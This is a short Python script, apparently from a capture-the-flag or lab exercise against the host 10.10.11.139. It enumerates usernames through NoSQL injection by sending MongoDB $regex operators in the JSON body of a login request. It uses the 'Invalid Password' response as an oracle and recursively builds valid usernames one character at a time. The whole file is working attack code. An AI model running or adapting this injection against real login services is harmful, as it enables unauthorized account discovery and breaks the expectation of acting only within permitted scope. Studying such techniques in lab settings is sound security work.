#!/usr/bin/env python3

import requests
import string


def brute_username(user):
    for c in string.ascii_lowercase:
        print(f'\r{user}{c:<50}', end='')
        payload = { 'user':
                       { '$regex' : f'^{user}{c}' },
                    'password': '0xdf'
                  }
        resp = requests.post('http://10.10.11.139:5000/login', json=payload)

        if 'Invalid Password' in resp.text:
            payload = {'user': f'{user}{c}', 'password': '0xdf'}
            resp = requests.post('http://10.10.11.139:5000/login', json=payload)
            if 'Invalid Password' in resp.text:
                print(f'\r{user}{c}')
            brute_username(f'{user}{c}')


brute_username('')
print('\r', end='')
